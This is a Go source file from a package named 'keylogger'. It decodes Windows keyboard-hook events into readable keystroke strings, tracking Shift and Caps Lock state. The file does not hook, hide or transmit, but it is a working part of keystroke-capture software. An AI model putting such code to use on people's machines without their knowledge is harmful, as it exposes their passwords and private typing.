package keylogger

import (
	"fmt"
	"unicode"

	"github.com/Spriithy/gkl/user32"
	"github.com/Spriithy/gkl/wintypes"
)

var whKeyStateNames = map[wintypes.WPARAM]string{
	wintypes.WM_KEYUP:      "KeyUp",
	wintypes.WM_KEYDOWN:    "KeyDown",
	wintypes.WM_SYSKEYUP:   "SysKeyUp",
	wintypes.WM_SYSKEYDOWN: "SysKeyDown",
}

type KeyStrokeDecoder struct {
	input      chan *KeyboardEvent
	output     chan string
	shiftState bool
	capsState  bool
}

func NewKeyStrokeDecoder(input chan *KeyboardEvent, output chan string) *KeyStrokeDecoder {
	return &KeyStrokeDecoder{
		input:  input,
		output: output,
	}
}

func (ksd *KeyStrokeDecoder) Listen() {
	for {
		event := <-ksd.input
		kbd := event.HookStruct

		switch {
		case event.IsShift():
			ksd.shiftState = event.IsKeyDown()
		case event.IsCaps():
			if event.IsKeyDown() {
				ksd.capsState = !ksd.capsState
			}
		case event.IsControl():
		case event.IsKeyDown():
			key := user32.MapVirtualKeyExW(wintypes.UINT(kbd.VkCode), wintypes.MAPVK_VK_TO_CHAR, event.Layout)
			var modifier string
			switch {
			case ksd.capsState && ksd.shiftState:
				break
			case ksd.capsState:
				modifier = "CAPS"
			case ksd.shiftState:
				modifier = "SHIFT"
			}

			switch {
			case ksd.capsState && ksd.shiftState:
				ksd.output <- fmt.Sprintf("%s: %c", whKeyStateNames[event.WParam], unicode.ToLower(rune(key)))
			case ksd.shiftState || ksd.capsState:
				ksd.output <- fmt.Sprintf("%s: %s + %c", whKeyStateNames[event.WParam], modifier, key)
			default:
				ksd.output <- fmt.Sprintf("%s: %c", whKeyStateNames[event.WParam], unicode.ToLower(rune(key)))
			}
		}
	}
}
